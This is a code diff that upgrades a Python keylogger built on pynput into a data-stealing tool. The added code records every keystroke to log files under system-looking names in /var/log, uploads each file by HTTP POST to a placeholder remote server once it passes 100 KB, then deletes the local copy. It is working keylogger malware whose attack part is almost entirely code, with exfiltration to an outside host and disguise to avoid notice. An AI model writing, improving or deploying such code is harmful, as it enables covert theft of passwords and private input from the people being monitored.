@@ -1,15 +1,84 @@
+#!/usr/bin/env python3
 from pynput.keyboard import Listener
 from pathlib import Path
 import logging
+import datetime
+import requests
+import os
 
-LOGFILE = Path("another_keystrokes_local.log")
+# === Configuration ===
+MAX_SIZE = 100 * 1024
+SERVER_URL = "https://REMOTE_SERVER/upload"
+LOG_DIR = Path("/var/log/SYSTEM_DATA")
+ACTIVE_FILE = LOG_DIR / "daemon_current.txt"
 
-current_dir = Path(__file__).resolve().parent
-log_path = current_dir / "another_keystrokes_local.txt"
+# === Helper functions ===
+def current_logfile():
+    """Generate a new log filename based on timestamp."""
+    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    return LOG_DIR / f"daemon_log_{ts}.txt"
 
+def get_active_logfile():
+    """Return the current active logfile, or create one."""
+    if ACTIVE_FILE.exists():
+        path = Path(ACTIVE_FILE.read_text().strip())
+        if path.exists():
+            return path
+    new_path = current_logfile()
+    ACTIVE_FILE.write_text(str(new_path))
+    return new_path
 
-logging.basicConfig(filename = (log_path), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+def check_file_size(file_path):
+    """Calculate file size of log txt."""
+    try:
+      file_size = os.path.getsize(file_path)
+      if file_size >= MAX_SIZE:
+          return True
+      else: 
+          return False
+    except OSError as e:
+      print(f"Error accessing file '{file_path}': {e}")
+      return False
+
+def upload_and_reset(file_path):
+    """Upload file via POST, delete it, create a new one."""
+    try:
+        with open(file_path, "rb") as f:
+            files = {"file": f}
+            print(f"[+] Uploading {file_path} → {SERVER_URL}")
+            requests.post(SERVER_URL, files=files, timeout=5)
+    except Exception as e:
+        print(f"[!] Upload failed: {e}")
+        return file_path  # keep same file if failed
+
+    try:
+        os.remove(file_path)
+        print(f"[+] Removed {file_path}")
+    except Exception as e:
+        print(f"[!] Could not remove {file_path}: {e}")
+
+    new_path = current_logfile()
+    ACTIVE_FILE.write_text(str(new_path))
+    setup_logging(new_path)
+    return new_path
+
+def setup_logging(logfile_path):
+    """Configure logging to a given file."""
+    logging.basicConfig(
+        filename=str(logfile_path),
+        level=logging.DEBUG,
+        format="%(asctime)s: %(message)s"
+    )
+
+# === Main logic ===
+logfile = get_active_logfile()
+setup_logging(logfile)
+
 def on_press(key):
-  logging.info(str(key))
+    global logfile
+    logging.info(str(key))
+    if check_file_size(logfile):
+        logfile = upload_and_reset(logfile)
+
 with Listener(on_press=on_press) as listener:
-  listener.join()
+    listener.join()
